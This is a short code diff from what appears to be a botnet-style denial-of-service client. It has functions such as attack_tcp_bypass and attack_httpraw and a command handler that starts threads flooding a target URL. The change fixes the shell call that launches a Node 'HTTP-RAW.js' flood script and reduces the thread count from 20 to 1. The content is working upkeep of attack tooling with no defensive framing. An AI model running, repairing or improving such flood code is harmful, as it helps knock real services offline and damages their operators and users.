@@ -133,7 +133,7 @@ def attack_tcp_bypass(ip, port, end_time, size):
 
 
 def attack_httpraw(url, end_time):
-    os.system(f'node HTTP-RAW {url} {end_time}')
+    os.system(f'node HTTP-RAW.js {url} {end_time}')
 
 
 
@@ -254,7 +254,7 @@ def main():
                     duration = int(args[2])
                     end_time = time.time() + duration
                     size = 65500
-                    threads = 20
+                    threads = 1
                     for _ in range(threads):
                         threading.Thread(target=attack_httpraw, args=(url, end_time), daemon=True).start()
                 elif command == 'PING':
